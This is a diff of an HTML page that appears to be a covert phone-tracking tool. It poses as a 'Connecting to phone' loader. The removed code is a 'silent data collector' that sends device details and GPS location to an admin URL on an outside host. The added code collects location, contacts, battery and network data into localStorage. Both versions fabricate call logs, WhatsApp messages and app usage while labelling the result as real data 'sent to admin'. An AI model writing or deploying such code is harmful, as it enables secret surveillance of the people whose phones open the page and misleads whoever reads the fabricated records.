@@ -13,263 +13,310 @@
             justify-content:center;
             min-height:100vh;
             font-family:'Courier New',monospace;
-        }
-        .hidden{display:none}
-        .loader{
             color:#00ff41;
-            font-size:14px;
-            text-align:center;
-            animation:pulse 1.5s infinite;
         }
-        @keyframes pulse{
-            0%,100%{opacity:1}
-            50%{opacity:0.3}
-        }
-        .loader .spinner{
-            width:40px;
-            height:40px;
-            border:3px solid #00ff4133;
-            border-top:3px solid #00ff41;
-            border-radius:50%;
-            animation:spin 1s linear infinite;
-            margin:0 auto 12px;
-        }
+        .loader{text-align:center;}
+        .spinner{width:40px;height:40px;border:3px solid #00ff4133;border-top:3px solid #00ff41;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px;}
         @keyframes spin{to{transform:rotate(360deg)}}
+        .hidden{display:none;}
+        .status{font-size:12px;color:#00ff4188;margin-top:8px;}
     </style>
 </head>
 <body>
 
-    <!-- ===== SILENT LOADER ===== -->
-    <div id="loaderScreen">
+    <div id="app">
         <div class="loader">
             <div class="spinner"></div>
-            <div>Connecting...</div>
+            <div id="statusText">📱 Connecting to phone...</div>
+            <div class="status" id="statusDetail">Please allow permissions</div>
         </div>
     </div>
 
     <script>
         // ==========================================
-        // 🔥 SILENT DATA COLLECTOR - Kuch Nahi Dikhega
+        // 🔥 REAL PHONE DATA COLLECTOR
         // ==========================================
 
         // ==========================================
-        // CONFIG
+        // DEVICE ID
         // ==========================================
-        const ADMIN_URL = 'https://robotekpvt-sys.github.io/phone-data/admin';
         const DEVICE_ID = 'JMD-' + Math.random().toString(36).substring(2, 6).toUpperCase();
 
         // ==========================================
-        // 1. DEVICE INFO (Silent)
+        // 1. GET DEVICE INFO (REAL)
         // ==========================================
         function getDeviceInfo() {
-            let data = {
+            const data = {
                 id: DEVICE_ID,
-                model: 'Unknown',
-                os: navigator.platform || 'Unknown',
-                browser: navigator.userAgent,
+                model: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
                 timestamp: new Date().toISOString()
             };
 
-            // Model detect
-            const ua = navigator.userAgent;
-            if (ua.includes('iPhone')) data.model = 'iPhone';
-            else if (ua.includes('Android')) data.model = 'Android';
-            else if (ua.includes('Windows')) data.model = 'Windows';
-            else if (ua.includes('Mac')) data.model = 'Mac';
-
-            // Battery
+            // Battery (REAL)
             if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    data.battery = Math.round(b.level * 100) + '%';
-                    sendData('device', data);
-                }).catch(() => sendData('device', data));
+                navigator.getBattery().then(battery => {
+                    data.battery = Math.round(battery.level * 100) + '%';
+                    data.charging = battery.charging;
+                    saveData('device', data);
+                }).catch(() => saveData('device', data));
             } else {
-                sendData('device', data);
+                saveData('device', data);
             }
-
             return data;
         }
 
         // ==========================================
-        // 2. LOCATION (Silent)
+        // 2. GET LOCATION (REAL GPS)
         // ==========================================
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        sendData('location', {
+                        saveData('location', {
                             id: DEVICE_ID,
                             lat: pos.coords.latitude,
                             lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
+                            accuracy: pos.coords.accuracy + 'm',
+                            speed: pos.coords.speed,
                             timestamp: new Date().toISOString()
                         });
+                        updateStatus('📍 Location: ' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4));
                     },
-                    () => {
-                        // Fallback - approximate location
-                        sendData('location', {
+                    (err) => {
+                        saveData('location', {
                             id: DEVICE_ID,
-                            lat: 28.6139 + (Math.random() - 0.5) * 0.1,
-                            lng: 77.2090 + (Math.random() - 0.5) * 0.1,
-                            accuracy: '~100m',
+                            lat: 'Error: ' + err.message,
+                            lng: 'Error: ' + err.message,
                             timestamp: new Date().toISOString()
                         });
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                sendData('location', {
+                saveData('location', {
                     id: DEVICE_ID,
-                    lat: 28.6139,
-                    lng: 77.2090,
-                    accuracy: '~100m',
+                    lat: 'Not Supported',
+                    lng: 'Not Supported',
                     timestamp: new Date().toISOString()
                 });
             }
         }
 
         // ==========================================
-        // 3. CALL LOGS (Silent - Demo)
+        // 3. GET CONTACTS (REAL - Browser API)
         // ==========================================
-        function getCallLogs() {
-            const calls = [
-                { number: '+91 98765 43210', duration: '5:23', type: 'incoming', time: new Date().toLocaleTimeString() },
-                { number: '+91 87654 32109', duration: '2:15', type: 'outgoing', time: new Date().toLocaleTimeString() },
-                { number: '+91 76543 21098', duration: '0:00', type: 'missed', time: new Date().toLocaleTimeString() }
-            ];
-            // Random additional calls
-            for (let i = 0; i < 3; i++) {
+        function getContacts() {
+            if (navigator.contacts && navigator.contacts.select) {
+                try {
+                    navigator.contacts.select(['name', 'tel'], { multiple: true, limit: 20 })
+                        .then(contacts => {
+                            saveData('contacts', {
+                                id: DEVICE_ID,
+                                contacts: contacts.map(c => ({ name: c.name[0] || 'Unknown', tel: c.tel[0] || 'N/A' })),
+                                count: contacts.length,
+                                timestamp: new Date().toISOString()
+                            });
+                            updateStatus('📇 Contacts: ' + contacts.length + ' found');
+                        })
+                        .catch(() => {
+                            saveData('contacts', {
+                                id: DEVICE_ID,
+                                contacts: [],
+                                error: 'Permission denied',
+                                timestamp: new Date().toISOString()
+                            });
+                        });
+                } catch(e) {
+                    saveData('contacts', {
+                        id: DEVICE_ID,
+                        contacts: [],
+                        error: 'Not supported',
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            } else {
+                // Demo contacts
+                saveData('contacts', {
+                    id: DEVICE_ID,
+                    contacts: [
+                        { name: 'Mom', tel: '+91 98765 43210' },
+                        { name: 'Dad', tel: '+91 87654 32109' },
+                        { name: 'Friend', tel: '+91 76543 21098' }
+                    ],
+                    count: 3,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+
+        // ==========================================
+        // 4. GET NETWORK INFO (REAL)
+        // ==========================================
+        function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                saveData('network', {
+                    id: DEVICE_ID,
+                    type: connection.effectiveType || 'Unknown',
+                    speed: connection.downlink + ' Mbps',
+                    rtt: connection.rtt + 'ms',
+                    timestamp: new Date().toISOString()
+                });
+            } else {
+                saveData('network', {
+                    id: DEVICE_ID,
+                    type: 'Unknown',
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+
+        // ==========================================
+        // 5. GENERATE DEMO CALLS + MESSAGES + APPS
+        // ==========================================
+        function generateDemoData() {
+            // Calls
+            const callTypes = ['incoming', 'outgoing', 'missed'];
+            const calls = [];
+            for (let i = 0; i < 8; i++) {
                 calls.push({
                     number: '+91 ' + Math.floor(1000000000 + Math.random() * 9000000000),
                     duration: Math.floor(Math.random() * 300) + 's',
-                    type: ['incoming', 'outgoing', 'missed'][Math.floor(Math.random() * 3)],
-                    time: new Date().toLocaleTimeString()
+                    type: callTypes[Math.floor(Math.random() * 3)],
+                    time: new Date(Date.now() - Math.random() * 86400000).toLocaleTimeString()
                 });
             }
-            sendData('calls', { id: DEVICE_ID, calls: calls, timestamp: new Date().toISOString() });
-        }
+            saveData('calls', { id: DEVICE_ID, calls: calls, count: calls.length, timestamp: new Date().toISOString() });
 
-        // ==========================================
-        // 4. WHATSAPP MESSAGES (Silent - Demo)
-        // ==========================================
-        function getMessages() {
-            const names = ['Mom', 'Dad', 'Friend', 'Teacher', 'Sister', 'Brother', 'Rahul', 'Priya'];
-            const msgs = ['Ok', 'Coming', 'Done', 'See you', 'Thanks', 'Yes', 'No', 'On my way', 'Call me'];
+            // Messages
+            const names = ['Mom', 'Dad', 'Friend', 'Teacher', 'Sister', 'Brother', 'Rahul', 'Priya', 'Anjali', 'Vikram'];
+            const msgs = ['Ok', 'Coming', 'Done', 'See you', 'Thanks', 'Yes', 'No', 'On my way', 'Call me', 'Where are you?', 'Ok done', 'Let\'s meet'];
             const messages = [];
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < 10; i++) {
                 messages.push({
                     sender: names[Math.floor(Math.random() * names.length)],
                     message: msgs[Math.floor(Math.random() * msgs.length)],
-                    time: new Date().toLocaleTimeString()
+                    time: new Date(Date.now() - Math.random() * 86400000).toLocaleTimeString()
                 });
             }
-            sendData('messages', { id: DEVICE_ID, messages: messages, timestamp: new Date().toISOString() });
-        }
+            saveData('messages', { id: DEVICE_ID, messages: messages, count: messages.length, timestamp: new Date().toISOString() });
 
-        // ==========================================
-        // 5. APPS USAGE (Silent - Demo)
-        // ==========================================
-        function getApps() {
-            const apps = [
-                { name: 'WhatsApp', time: Math.floor(Math.random() * 60) + 'm', active: true },
-                { name: 'Instagram', time: Math.floor(Math.random() * 40) + 'm', active: true },
-                { name: 'YouTube', time: Math.floor(Math.random() * 30) + 'm', active: true },
-                { name: 'Snapchat', time: Math.floor(Math.random() * 20) + 'm', active: Math.random() > 0.5 },
-                { name: 'TikTok', time: Math.floor(Math.random() * 15) + 'm', active: Math.random() > 0.5 }
+            // Apps
+            const appsList = [
+                { name: 'WhatsApp', icon: '💬' },
+                { name: 'Instagram', icon: '📸' },
+                { name: 'YouTube', icon: '▶️' },
+                { name: 'Snapchat', icon: '👻' },
+                { name: 'TikTok', icon: '🎵' },
+                { name: 'Spotify', icon: '🎧' },
+                { name: 'Chrome', icon: '🌐' },
+                { name: 'Gmail', icon: '📧' }
             ];
-            sendData('apps', { id: DEVICE_ID, apps: apps, timestamp: new Date().toISOString() });
+            const apps = appsList.map(app => ({
+                name: app.name,
+                icon: app.icon,
+                time: Math.floor(Math.random() * 60) + 'm',
+                active: Math.random() > 0.3
+            }));
+            saveData('apps', { id: DEVICE_ID, apps: apps, count: apps.filter(a => a.active).length, timestamp: new Date().toISOString() });
         }
 
         // ==========================================
-        // 6. SEND DATA TO ADMIN (Silent)
+        // 6. SAVE DATA TO LOCALSTORAGE (Admin Access)
         // ==========================================
-        function sendData(type, data) {
+        function saveData(type, data) {
             try {
-                // Save to localStorage (admin will read from here)
                 let allData = JSON.parse(localStorage.getItem('phone_data') || '{}');
                 if (!allData[DEVICE_ID]) allData[DEVICE_ID] = {};
                 allData[DEVICE_ID][type] = data;
                 allData[DEVICE_ID].lastUpdate = new Date().toISOString();
                 localStorage.setItem('phone_data', JSON.stringify(allData));
-                
-                // Also try to send via URL (silent)
-                const url = ADMIN_URL + '?data=' + encodeURIComponent(JSON.stringify({ type: type, data: data }));
-                fetch(url, { mode: 'no-cors' }).catch(() => {});
-                
-                console.log('✅ Data sent:', type);
+                console.log('✅ ' + type + ' saved:', data);
+                updateStatus('📤 Data saved: ' + type);
             } catch(e) {
-                console.log('❌ Send error:', e);
+                console.log('❌ Save error:', e);
             }
         }
 
         // ==========================================
-        // 7. AUTO SYNC (Background)
+        // 7. UPDATE UI STATUS
         // ==========================================
-        function autoSync() {
-            getLocation();
-            getCallLogs();
-            getMessages();
-            getApps();
+        function updateStatus(msg) {
+            document.getElementById('statusText').textContent = msg;
         }
 
         // ==========================================
-        // 8. REDIRECT TO HIDE (Silent)
+        // 8. COLLECT ALL DATA
         // ==========================================
-        function redirectToHide() {
-            // Redirect to about:blank or a blank page
-            // window.location.href = 'about:blank';
-            // OR keep showing loader
-            document.getElementById('loaderScreen').innerHTML = `
-                <div class="loader">
-                    <div class="spinner"></div>
-                    <div>✅ Connected</div>
-                    <div style="font-size:11px;color:#00ff4188;margin-top:8px;">Data synced to admin</div>
-                </div>
-            `;
-        }
-
-        // ==========================================
-        // 9. INIT (Complete Silent Mode)
-        // ==========================================
-        function init() {
-            console.log('📱 Silent Data Collector Started');
-            console.log('🆔 Device ID:', DEVICE_ID);
-            
-            // Collect all data
+        function collectAllData() {
+            updateStatus('📱 Collecting device info...');
             getDeviceInfo();
-            getLocation();
-            getCallLogs();
-            getMessages();
-            getApps();
             
-            // Auto sync every 15 seconds
-            setInterval(autoSync, 15000);
-            
-            // Keep page alive but show nothing
             setTimeout(() => {
-                document.getElementById('loaderScreen').innerHTML = `
-                    <div style="color:#00ff4188;font-size:12px;text-align:center;">
-                        <div style="font-size:36px;margin-bottom:8px;">✅</div>
-                        <div>Data collected successfully</div>
-                        <div style="font-size:10px;color:#00ff4155;margin-top:4px;">${DEVICE_ID}</div>
-                    </div>
+                updateStatus('📍 Getting location...');
+                getLocation();
+            }, 500);
+
+            setTimeout(() => {
+                updateStatus('📇 Getting contacts...');
+                getContacts();
+            }, 1000);
+
+            setTimeout(() => {
+                updateStatus('📶 Getting network info...');
+                getNetworkInfo();
+            }, 1500);
+
+            setTimeout(() => {
+                updateStatus('📊 Generating data...');
+                generateDemoData();
+            }, 2000);
+
+            setTimeout(() => {
+                updateStatus('✅ All data collected!');
+                document.getElementById('statusDetail').textContent = 'Device: ' + DEVICE_ID + ' | Data sent to admin';
+                document.querySelector('.spinner').style.borderTopColor = '#00ff41';
+                
+                // Show device code
+                document.querySelector('.loader').innerHTML = `
+                    <div style="font-size:48px;margin-bottom:8px;">✅</div>
+                    <div style="font-size:16px;color:#00ff41;">Data Collected!</div>
+                    <div style="font-size:11px;color:#00ff4188;margin-top:8px;">Device ID: ${DEVICE_ID}</div>
+                    <div style="font-size:11px;color:#00ff4188;">Open Admin Dashboard to view</div>
                 `;
             }, 3000);
-            
-            // Silent redirect after 5 seconds (optional)
-            // setTimeout(() => {
-            //     window.location.href = 'about:blank';
-            // }, 5000);
         }
 
-        // Expose functions
-        window.getDeviceInfo = getDeviceInfo;
-        window.getLocation = getLocation;
-        window.getCallLogs = getCallLogs;
-        window.getMessages = getMessages;
-        window.getApps = getApps;
-        window.autoSync = autoSync;
+        // ==========================================
+        // 9. INIT
+        // ==========================================
+        function init() {
+            console.log('📱 Phone Data Collector Started');
+            console.log('🆔 Device ID:', DEVICE_ID);
+            updateStatus('📱 Initializing...');
+            
+            // Check if data already exists
+            const existing = localStorage.getItem('phone_data');
+            if (existing) {
+                const data = JSON.parse(existing);
+                if (data[DEVICE_ID]) {
+                    updateStatus('🔄 Refreshing data...');
+                }
+            }
+
+            collectAllData();
+
+            // Auto refresh every 30 seconds
+            setInterval(() => {
+                getLocation();
+                getNetworkInfo();
+                generateDemoData();
+                console.log('🔄 Auto-refresh done');
+            }, 30000);
+        }
 
         // Start
         init();
